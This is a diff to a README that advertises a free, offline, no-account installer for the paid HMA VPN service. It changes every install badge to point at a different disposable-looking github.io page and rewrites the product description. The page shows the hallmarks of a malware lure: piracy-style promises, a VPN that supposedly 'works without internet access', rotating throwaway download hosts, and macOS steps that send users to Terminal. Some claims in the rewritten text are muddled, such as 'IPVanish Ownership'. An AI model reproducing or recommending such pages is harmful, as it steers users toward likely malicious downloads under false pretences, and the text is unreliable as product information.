@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-VPN-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 HMA VPN Free Installer** — HMA VPN (Hide My Ass) is a VPN service with servers in 190+ countries, one of the largest server networks of any VPN provider. Works without internet access, no account required. Full offline installation.
+**💻 HMA VPN Free Installer** — HMA (HideMyAss) VPN is one of the oldest VPN services with a large server network spanning 290+ locations. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install HMA VPN](https://img.shields.io/badge/⬇_Install_HMA+VPN-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install HMA VPN](https://img.shields.io/badge/⬇_Install_HMA+VPN-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About HMA VPN
 
-HMA VPN (Hide My Ass) is a VPN service with servers in 190+ countries, one of the largest server networks of any VPN provider. Available for Windows, macOS, iOS, Android, and Linux, HMA VPN supports IP Shuffle for randomly changing IPs, a kill switch, and split tunneling. HMA's large server network makes it particularly useful for users needing geographic coverage in less-served regions.
+HMA (HideMyAss) VPN is one of the oldest VPN services with a large server network spanning 290+ locations. It provides standard VPN privacy features with a straightforward interface and IP Shuffle for automatic IP rotation.
 
 ---
 
 ## ❌ Problem: HMA VPN is hard to access
 
-- **Subscription Required** — Monthly or annual fee
-- **Privacy History** — Historical concerns about logging practices
-- **Performance Consistency** — Server quality varies across its very large network
-- **Price Point** — Monthly pricing among the higher end for VPN services
+- **IPVanish Ownership** — Acquired by J2 Global raising some privacy concerns
+- **Past Controversies** — Historical user data disclosure incident created lasting reputation questions
+- **Subscription Cost** — Higher pricing compared to competing services
+- **Speed Variance** — Performance varies significantly across server locations
 
 ---
 
@@ -61,9 +61,9 @@ HMA VPN (Hide My Ass) is a VPN service with servers in 190+ countries, one of th
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ HMA VPN (Hide My Ass) is a VPN service with servers in 190+ countries, one of th
 
 <div align="center">
 
-[![⬇ Install HMA VPN](https://img.shields.io/badge/⬇_Install_HMA+VPN-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install HMA VPN](https://img.shields.io/badge/⬇_Install_HMA+VPN-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ HMA VPN (Hide My Ass) is a VPN service with servers in 190+ countries, one of th
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ HMA VPN (Hide My Ass) is a VPN service with servers in 190+ countries, one of th
 
 ---
 
-**HMA VPN Free Installer** — HMA VPN (Hide My Ass) is a VPN service with servers in 190+ countries, one of the largest server networks of any VPN provider. Install without internet connection today!
+**HMA VPN Free Installer** — HMA (HideMyAss) VPN is one of the oldest VPN services with a large server network spanning 290+ locations. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install HMA VPN](https://img.shields.io/badge/⬇_Install_HMA+VPN-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install HMA VPN](https://img.shields.io/badge/⬇_Install_HMA+VPN-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
